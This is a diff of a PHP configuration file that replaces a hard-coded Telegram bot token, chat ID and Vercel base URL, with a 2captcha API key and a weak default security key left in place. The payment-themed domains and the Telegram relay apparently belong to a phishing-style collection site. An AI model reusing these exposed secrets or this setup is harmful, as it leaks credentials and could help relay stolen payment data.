@@ -25,15 +25,15 @@ if (getenv('DATABASE_URL')) {
 }
 
 return [
-    'botToken' => getenv('BOT_TOKEN') ?: '8635283514:AAFh6dwBMtmuvK5FgLgj4eyW6PV1Gciktqk',
-    'chatId' => getenv('CHAT_ID') ?: '-1004376731124',
+    'botToken' => getenv('BOT_TOKEN') ?: '8666757484:AAHhvPEF0SHYMDRool4VxhCZdO-vZlNOl_Q',
+    'chatId' => getenv('CHAT_ID') ?: '-5184887669',
     'db_host' => $db_host,
     'db_user' => $db_user,
     'db_pass' => $db_pass,
     'db_name' => $db_name,
     'db_port' => $db_port,
     'db_sslmode' => 'require',
-    'baseUrl' => getenv('BASE_URL') ?: 'https://recaudoairepago.vercel.app/updatetele.php',
+    'baseUrl' => getenv('BASE_URL') ?: 'https://recaudoairefactura.vercel.app/updatetele.php',
     'security_key' => getenv('SECURITY_KEY') ?: 'secure_key_123',
     'twocaptcha_api_key' => '12f9e3865d60235df14c8dff5e8854b9'
 ];
